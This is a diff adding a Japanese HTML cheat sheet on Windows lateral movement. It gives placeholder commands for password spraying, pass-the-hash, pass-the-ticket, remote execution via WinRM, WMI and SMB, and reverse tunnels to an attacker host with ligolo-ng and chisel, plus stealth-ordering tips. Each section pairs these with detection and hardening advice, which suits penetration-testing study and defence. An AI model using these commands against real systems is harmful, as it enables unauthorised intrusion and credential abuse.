@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lateral Movement — d0me</title>
+<meta name="description" content="横展開の索引。認証情報の再利用・リモート実行(WinRM/WMI/SMB)・トンネリングとピボット、そして検知。">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>参 · Lateral Movement</div>
+    <h1><span class="idx">参</span>Lateral Movement</h1>
+    <p class="lede">一台の掌握を面へ広げる。認証情報の再利用、リモート実行、そして到達不能なセグメントへのトンネリング。すべてラボ想定・プレースホルダ。
+      <span class="jp">前提: あるホストで管理者権限、または再利用可能な資格情報/ハッシュを保持。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#creds">01 認証情報の再利用</a></li>
+      <li><a href="#exec">02 リモート実行</a></li>
+      <li><a href="#tunnel">03 トンネリング</a></li>
+      <li><a href="#pivot">04 ピボット設計</a></li>
+      <li><a href="#ref">05 参照</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <section id="creds" class="reveal">
+      <h2><span class="num">01</span>認証情報の再利用<span class="jp">reuse</span></h2>
+      <p>横展開の燃料は使い回された資格情報。平文・NT ハッシュ・Kerberos チケットのいずれで動くかを整理する。</p>
+
+      <h3>スプレー(まず面を測る)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 1組の資格情報がどのホストで管理者か</span>
+nxc smb <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>'
+<span class="c"># (Pwn3d! 表示 = ローカル管理者)</span></code></pre></div>
+
+      <h3>Pass-the-Hash</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NT ハッシュでそのまま認証</span>
+nxc smb <span class="v">&lt;TARGET&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -H '<span class="v">&lt;NTHASH&gt;</span>'
+psexec.py -hashes :<span class="v">&lt;NTHASH&gt;</span> \
+  <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;USER&gt;</span>'@<span class="v">&lt;TARGET&gt;</span></code></pre></div>
+
+      <h3>Pass-the-Ticket</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ccache を環境変数に設定して Kerberos で認証</span>
+export KRB5CCNAME=<span class="v">&lt;TICKET&gt;</span>.ccache
+psexec.py -k -no-pass <span class="v">&lt;TARGET.FQDN&gt;</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>ローカル管理者パスワードを LAPS で個別化し、PtH の横展開連鎖を断つ。</li>
+          <li>Protected Users / Credential Guard でメモリ上の資格情報露出を抑制。</li>
+          <li>同一アカウントの短時間・多ホストログオン(4624 type 3/9)を相関検知。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="exec" class="reveal">
+      <h2><span class="num">02</span>リモート実行<span class="jp">remote exec</span></h2>
+      <p>実行チャネルは検知プロファイルが異なる。SMB サービス生成は目立ち、WinRM は正規運用に紛れやすい。到達性と静粛性で選ぶ。</p>
+      <table>
+        <thead><tr><th>手段</th><th>ポート</th><th>特徴</th></tr></thead>
+        <tbody>
+          <tr><td>WinRM</td><td>5985/5986</td><td>正規運用に紛れやすい・対話向き</td></tr>
+          <tr><td>WMI</td><td>135 + 動的</td><td>サービス生成なし・比較的静か</td></tr>
+          <tr><td>SMB (psexec 系)</td><td>445</td><td>サービス生成で目立つ・確実</td></tr>
+        </tbody>
+      </table>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># WinRM 対話（ハッシュ可）</span>
+evil-winrm -i <span class="v">&lt;TARGET&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -H '<span class="v">&lt;NTHASH&gt;</span>'
+
+<span class="c"># WMI 実行（サービス生成なし）</span>
+wmiexec.py <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;USER&gt;</span>':'<span class="v">&lt;PASS&gt;</span>'@<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># 一斉コマンド実行</span>
+nxc winrm <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>' -x 'whoami'</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>管理チャネル(WinRM/WMI)を管理ホストからの JIT 接続に限定。</li>
+          <li>7045(サービスインストール)、4688(疑わしい親子: services.exe→cmd 等)を監視。</li>
+          <li>横方向の 445/5985 を微細セグメント化で制限。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="tunnel" class="reveal">
+      <h2><span class="num">03</span>トンネリング<span class="jp">到達性を作る</span></h2>
+      <p>掌握ホストを踏み台に、直接届かない内部セグメントへ経路を通す。手元は <code>ligolo-ng</code> と <code>chisel</code>。</p>
+
+      <h3>ligolo-ng(推奨・TUN ベース)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 攻撃側: proxy 起動 + インタフェース準備</span>
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+<span class="c"># ligolo> session → 内部サブネットを追加 → route</span>
+sudo ip route add <span class="v">&lt;INTERNAL_SUBNET&gt;</span> dev ligolo</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 掌握ホスト側で agent を実行</span>
+./agent -connect <span class="v">$LHOST</span>:11601 -ignore-cert</code></pre></div>
+
+      <h3>chisel(HTTP 上の TCP トンネル)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 攻撃側 server / 掌握側 client（reverse socks）</span>
+./chisel server -p 8080 --reverse
+./chisel client <span class="v">$LHOST</span>:8080 R:socks</code></pre></div>
+
+      <div class="note"><span class="lbl">tips</span>LHOST(tun0)は接続毎に変わる: <code>ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1</code></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>egress を許可プロキシ経由に限定し、長時間持続する外向き TCP/TLS を異常として検知。</li>
+          <li>サーバ資産からの想定外の外向き接続(特に高ポート・自己署名 TLS)を監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="pivot" class="reveal">
+      <h2><span class="num">04</span>ピボット設計<span class="jp">順序と静粛性</span></h2>
+      <ul>
+        <li><strong>測ってから動く</strong> — スプレーで管理者範囲を把握し、最短で価値ある資産へ。</li>
+        <li><strong>静粛性の順</strong> — WMI/WinRM → 必要時のみ SMB サービス系。痕跡の重いものは後段に。</li>
+        <li><strong>経路は最小限</strong> — 不要なトンネルを張らない。多層トンネルは遅延と検知面を増やす。</li>
+      </ul>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>横展開の起点は再利用資格情報。LAPS と Credential Guard がそのまま最大の対策になる。</li>
+          <li>実行チャネルは検知プロファイルで選ぶ。確実さ(SMB)と静粛さ(WMI/WinRM)はトレードオフ。</li>
+          <li>ピボットは「到達性の生成」。egress 監視が防御側の要で、TUN より HTTP トンネルの方が紛れやすい。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="ref" class="reveal">
+      <h2><span class="num">05</span>参照<span class="jp">References</span></h2>
+      <ul>
+        <li>ligolo-ng — <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">github.com/nicocha30/ligolo-ng</a></li>
+        <li>chisel — <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">github.com/jpillora/chisel</a></li>
+        <li>Evil-WinRM — <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">github.com/Hackplayers/evil-winrm</a></li>
+        <li>MITRE ATT&amp;CK — Lateral Movement (TA0008) — <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Lateral Movement</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
